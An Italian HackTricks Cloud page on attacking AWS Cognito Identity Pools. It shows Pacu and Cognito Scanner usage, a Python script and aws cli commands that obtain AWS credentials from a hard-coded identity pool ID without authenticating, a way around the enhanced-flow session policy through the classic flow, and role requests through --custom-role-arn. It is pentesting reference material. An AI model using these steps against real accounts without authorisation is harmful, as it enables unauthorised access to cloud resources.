# Pool di identit√† Cognito

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}

## Informazioni di base

I pool di identit√† svolgono un ruolo cruciale consentendo ai tuoi utenti di **acquisire credenziali temporanee**. Queste credenziali sono essenziali per accedere a vari servizi AWS, tra cui ma non limitati a Amazon S3 e DynamoDB. Una caratteristica notevole dei pool di identit√† √® il supporto sia per gli utenti ospiti anonimi che per una serie di fornitori di identit√† per l'autenticazione degli utenti. I fornitori di identit√† supportati includono:

- Pool di utenti Amazon Cognito
- Opzioni di accesso tramite social come Facebook, Google, Accedi con Amazon e Accedi con Apple
- Fornitori conformi a OpenID Connect (OIDC)
- Fornitori di identit√† SAML (Security Assertion Markup Language)
- Identit√† autenticate dagli sviluppatori
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Per generare sessioni di Identity Pool, √® prima necessario **generare un ID di identit√†**. Questo ID di identit√† √® l'**identificazione della sessione di quell'utente**. Queste identificazioni possono avere fino a 20 set di dati che possono memorizzare fino a 1 MB di coppie chiave-valore.

Questo √® **utile per mantenere informazioni di un utente** (che utilizzer√† sempre lo stesso ID di identit√†).

Inoltre, il servizio **cognito-sync** √® il servizio che consente di **gestire e sincronizzare queste informazioni** (nei set di dati, inviando informazioni in stream e messaggi SNS...).

### Strumenti per il pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), il framework di sfruttamento AWS, include ora i moduli "cognito\_\_enum" e "cognito\_\_attack" che automatizzano l'enumerazione di tutti gli asset Cognito in un account e segnalano configurazioni deboli, attributi utente utilizzati per il controllo degli accessi, ecc., e automatizzano anche la creazione di utenti (incluso il supporto MFA) e l'escalation dei privilegi basata su attributi personalizzabili modificabili, credenziali di pool di identit√† utilizzabili, ruoli assumibili nei token di identit√†, ecc.

Per una descrizione delle funzioni dei moduli, consultare la parte 2 del [post del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Per le istruzioni di installazione, consultare la pagina principale di [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Utilizzo

Esempio di utilizzo di cognito\_\_attack per tentare la creazione di un utente e tutti i vettori di privilegi contro un determinato pool di identit√† e un client pool di utenti:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Esempio di utilizzo di cognito\_\_enum per raccogliere tutti i pool di utenti, client pool di utenti, pool di identit√†, utenti, ecc. visibili nell'account AWS corrente:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) √® uno strumento CLI in python che implementa diversi attacchi su Cognito, inclusa la creazione indesiderata di account e l'escalation del pool di identit√†.

#### Installazione
```bash
$ pip install cognito-scanner
```
#### Utilizzo
```bash
$ cognito-scanner --help
```
Per ulteriori informazioni controlla https://github.com/padok-team/cognito-scanner

## Accesso ai Ruoli IAM

### Non autenticato

L'unica cosa di cui un attaccante ha bisogno per **ottenere le credenziali AWS** in un'app Cognito come utente non autenticato √® l'**ID del Pool di Identit√†**, e questo **ID deve essere codificato** nell'applicazione web/mobile affinch√© possa utilizzarlo. Un ID ha un formato simile a questo: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (non √® soggetto a forza bruta).

{% hint style="success" %}
Il **ruolo IAM Cognito non autenticato creato tramite** √® chiamato di default `Cognito_<Nome Pool di Identit√†>Unauth_Role`
{% endhint %}

Se trovi un ID del Pool di Identit√† codificato e consente agli utenti non autenticati, puoi ottenere le credenziali AWS con:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Oppure potresti utilizzare i seguenti **comandi aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Si noti che per impostazione predefinita un **utente Cognito non autenticato NON PU√í avere alcun permesso, anche se √® stato assegnato tramite una policy**. Controlla la sezione seguente.
{% endhint %}

### Flusso di autenticazione avanzato vs di base

La sezione precedente ha seguito il **flusso di autenticazione avanzato predefinito**. Questo flusso imposta una **policy di sessione restrittiva** al ruolo IAM generato per la sessione. Questa policy consentir√† solo alla sessione di [**utilizzare i servizi da questo elenco**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (anche se il ruolo aveva accesso ad altri servizi).

Tuttavia, c'√® un modo per aggirare questo, se l'**Identity pool ha abilitato il "Flusso di base (Classico)"**, l'utente sar√† in grado di ottenere una sessione utilizzando quel flusso che **non avr√† quella policy di sessione restrittiva**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Se ricevi questo **errore**, √® perch√© il **flusso di base non √® abilitato (predefinito)**

`Si √® verificato un errore (InvalidParameterException) durante la chiamata all'operazione GetOpenIdToken: il flusso di base (classico) non √® abilitato, utilizzare il flusso avanzato.`
{% endhint %}

Avendo un set di credenziali IAM dovresti controllare [a quali accessi hai diritto](../../#whoami) e provare a [escalare i privilegi](../../aws-privilege-escalation/).

### Autenticato

{% hint style="info" %}
Ricorda che **gli utenti autenticati** probabilmente avranno **autorizzazioni diverse**, quindi se puoi **registrarti nell'app**, prova a farlo e ottieni le nuove credenziali.
{% endhint %}

Potrebbero anche essere disponibili **ruoli** per **utenti autenticati che accedono al Pool di identit√†**.

Per questo potresti avere bisogno di accedere al **fornitore di identit√†**. Se si tratta di un **Cognito User Pool**, forse puoi abusare del comportamento predefinito e **creare un nuovo utente tu stesso**.

{% hint style="success" %}
Il **ruolo IAM Cognito autenticato creato tramite** √® chiamato per impostazione predefinita `Cognito_<Nome del pool di identit√†>Auth_Role`
{% endhint %}

In ogni caso, **l'esempio seguente** presuppone che tu abbia gi√† effettuato l'accesso all'interno di un **Cognito User Pool** utilizzato per accedere al Pool di identit√† (non dimenticare che potrebbero essere configurati anche altri tipi di fornitori di identit√†).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Ottieni l'identity_id dalla risposta del comando precedente
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Nel token di identit√† puoi trovare i ruoli a cui un utente ha accesso a causa dei Gruppi del Pool di utenti
# Usa --custom-role-arn per ottenere credenziali per un ruolo specifico
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
√à possibile **configurare ruoli IAM diversi a seconda del fornitore di identit√†** con cui l'utente effettua l'accesso o addirittura solo a seconda **dell'utente** (utilizzando claim). Pertanto, se hai accesso a diversi utenti attraverso lo stesso o diversi fornitori, potrebbe **essere utile effettuare l'accesso e accedere ai ruoli IAM di tutti loro**.
{% endhint %}

{% hint style="success" %}
Impara e pratica l'Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica l'Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
